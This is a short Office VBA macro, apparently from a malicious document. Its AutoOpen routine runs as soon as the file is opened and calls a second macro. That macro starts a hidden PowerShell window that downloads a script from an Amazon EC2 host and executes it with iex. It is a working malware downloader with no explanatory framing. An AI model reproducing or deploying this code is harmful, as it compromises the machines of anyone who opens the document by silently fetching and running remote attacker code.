Sub AutoOpen()
    Call Macro_Mark_4
End Sub

Sub Macro_Mark_4()
'
' Macro_Mark_4 Macro
'
'



Set shell_object = CreateObject("WScript.Shell")
shell_object.Run "powershell.exe -NoLogo iex ((New-Object Net.WebClient).DownloadString('http://ec2-18-216-194-197.us-east-2.compute.amazonaws.com/register.html'))", 0
End Sub